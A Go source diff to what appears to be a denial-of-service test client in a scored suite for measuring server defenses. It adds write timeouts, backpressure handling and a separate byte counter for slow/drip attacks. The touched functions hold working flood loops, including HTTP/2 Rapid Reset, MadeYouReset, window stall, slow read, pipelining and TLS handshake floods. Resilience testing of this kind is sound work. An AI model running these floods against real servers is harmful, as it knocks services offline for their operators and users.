@@ -48,8 +48,9 @@ type stats struct {
 	Reaped        int64   `json:"reaped"`
 	OpenAtEnd     int64   `json:"open_at_end"`
 	ConnectErrors int64   `json:"connect_errors"`
-	FramesSent    int64   `json:"frames_sent"`
-	BytesSent     int64   `json:"bytes_sent"`
+	FramesSent    int64   `json:"frames_sent,omitempty"`
+	BytesSent     int64   `json:"bytes_sent,omitempty"`
+	DripSentBytes int64   `json:"drip_sent_bytes,omitempty"` // slow/drip engines (scorer reads this, not bytes_sent)
 	ElapsedS      float64 `json:"elapsed_s"`
 	Client        string  `json:"client"`
 }
@@ -164,6 +165,7 @@ const (
 
 type counter struct {
 	st         *stats
+	drip       bool // route bytes to DripSentBytes (slow/drip engines) instead of BytesSent
 	accF, accB int64
 }
 
@@ -181,7 +183,11 @@ func (ct *counter) tally(frames, bytes int64) {
 func (ct *counter) flush() {
 	if ct.accF != 0 || ct.accB != 0 {
 		atomic.AddInt64(&ct.st.FramesSent, ct.accF)
-		atomic.AddInt64(&ct.st.BytesSent, ct.accB)
+		if ct.drip {
+			atomic.AddInt64(&ct.st.DripSentBytes, ct.accB)
+		} else {
+			atomic.AddInt64(&ct.st.BytesSent, ct.accB)
+		}
 		ct.accF, ct.accB = 0, 0
 	}
 }
@@ -228,11 +234,21 @@ func fanout(c *config, st *stats, alpn string, preface func(net.Conn) error,
 	wg.Wait()
 }
 
+// writeTO bounds every H2 write. We never read the H2 socket, so a server that
+// backpressures (bounded ACK/output buffers — i.e. a well-defended one) stops
+// reading and our Write would block forever; the loop deadline is only checked
+// *between* writes, so without this a single blocked Write hangs the goroutine
+// and fanout's Wait() — stalling the whole suite. A write timeout is treated as
+// reaped (matches attack.py, whose inherited 5s socket timeout does the same).
+const writeTO = 5 * time.Second
+
 // h2Preamble writes the connection preface + an empty SETTINGS frame.
 func h2Preamble(conn net.Conn) error {
+	conn.SetWriteDeadline(time.Now().Add(writeTO))
 	if _, err := conn.Write(h2Preface); err != nil {
 		return err
 	}
+	conn.SetWriteDeadline(time.Now().Add(writeTO))
 	_, err := conn.Write(frame(0x4, 0, 0, nil))
 	return err
 }
@@ -243,12 +259,14 @@ func writeLoop(conn net.Conn, deadline time.Time, st *stats, lead []byte, payloa
 	ct := counter{st: st}
 	defer ct.done()
 	if lead != nil {
+		conn.SetWriteDeadline(time.Now().Add(writeTO))
 		if _, err := conn.Write(lead); err != nil {
 			return true
 		}
 		ct.tally(1, int64(len(lead)))
 	}
 	for time.Now().Before(deadline) {
+		conn.SetWriteDeadline(time.Now().Add(writeTO))
 		if _, err := conn.Write(payload); err != nil {
 			return true
 		}
@@ -298,6 +316,7 @@ func rapidReset(c *config, st *stats) {
 		var sid uint32 = 1
 		for time.Now().Before(dl) && sid < 0x7fffffff {
 			msg := append(frame(0x1, 0x5, sid, hdr), frame(0x3, 0x0, sid, rst)...)
+			conn.SetWriteDeadline(time.Now().Add(writeTO))
 			if _, err := conn.Write(msg); err != nil {
 				return true
 			}
@@ -320,6 +339,7 @@ func madeYouReset(c *config, st *stats) {
 		var sid uint32 = 1
 		for time.Now().Before(dl) && sid < 0x7fffffff {
 			msg := append(frame(0x1, 0x5, sid, hdr), frame(0x8, 0x0, sid, badWU)...)
+			conn.SetWriteDeadline(time.Now().Add(writeTO))
 			if _, err := conn.Write(msg); err != nil {
 				return true
 			}
@@ -366,21 +386,33 @@ func largeUpload(c *config, st *stats) {
 		defer ct.done()
 		rbuf := make([]byte, 4096)
 		for time.Now().Before(dl) {
-			conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
+			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 			if _, err := conn.Write(headers); err != nil {
-				return true
+				if !isTimeout(err) {
+					return true // reset = reaped
+				}
+				continue // write timeout = backpressure, connection alive — retry
 			}
 			remaining := c.uploadSize
+			stalled := false
 			for remaining > 0 && time.Now().Before(dl) {
 				n := int64(len(chunk))
 				if n > remaining {
 					n = remaining
 				}
+				conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 				if _, err := conn.Write(chunk[:n]); err != nil {
-					return true // server capped the body and dropped us
+					if !isTimeout(err) {
+						return true // server capped the body and dropped us = reaped
+					}
+					stalled = true // backpressure — abandon this body, retry (not reaped)
+					break
 				}
 				ct.tally(0, n) // bytes, no completed request yet
 				remaining -= n
+			}
+			if stalled {
+				continue
 			}
 			ct.tally(1, 0) // one upload completed
 			conn.SetReadDeadline(time.Now().Add(1 * time.Second))
@@ -408,7 +440,7 @@ func pipeliningFlood(c *config, st *stats) {
 		for time.Now().Before(dl) {
 			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 			if _, err := conn.Write(batch); err != nil {
-				return true
+				return !isTimeout(err) // reset = reaped; write timeout = backpressure, stop but alive
 			}
 			ct.tally(int64(c.pipelineDepth), int64(len(batch)))
 		}
@@ -439,7 +471,9 @@ func tlsHandshakeFlood(c *config, st *stats) {
 					if !established {
 						atomic.AddInt64(&st.ConnectErrors, 1)
 					}
-					return
+					break // not return: a mid-loop dial failure (port exhaustion /
+					// the server starting to refuse — i.e. the attack working) must
+					// still record this worker's established + handshake count below.
 				}
 				established = true
 				hs++
@@ -515,7 +549,7 @@ func runSlow(c *config, st *stats, opener func(i int) []byte, dripper func(i, d 
 				return
 			}
 			atomic.AddInt64(&st.Established, 1)
-			ct := counter{st: st}
+			ct := counter{st: st, drip: true}
 			defer ct.done()
 			for d := 0; time.Now().Before(deadline); d++ {
 				conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
@@ -668,7 +702,7 @@ func slowRead(c *config, st *stats) {
 				return
 			}
 			atomic.AddInt64(&st.Established, 1)
-			ct := counter{st: st}
+			ct := counter{st: st, drip: true}
 			defer ct.done()
 			one := make([]byte, 1)
 			for time.Now().Before(deadline) {
@@ -697,6 +731,7 @@ func windowStall(c *config, st *stats) {
 	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
 		ct := counter{st: st}
 		defer ct.done()
+		conn.SetWriteDeadline(time.Now().Add(writeTO))
 		if _, err := conn.Write(settings0); err != nil {
 			return true
 		}
@@ -704,6 +739,7 @@ func windowStall(c *config, st *stats) {
 		var sid uint32 = 1
 		for i := 0; i < c.stallStreams; i++ {
 			hf := frame(0x1, 0x5, sid, block)
+			conn.SetWriteDeadline(time.Now().Add(writeTO))
 			if _, err := conn.Write(hf); err != nil {
 				return true
 			}
@@ -808,6 +844,7 @@ func main() {
 				ConnectErrors: atomic.LoadInt64(&st.ConnectErrors),
 				FramesSent:    atomic.LoadInt64(&st.FramesSent),
 				BytesSent:     atomic.LoadInt64(&st.BytesSent),
+				DripSentBytes: atomic.LoadInt64(&st.DripSentBytes),
 				ElapsedS:      time.Since(start).Seconds(),
 			}
 			// Connections still held when the attack ended (not reaped) — the
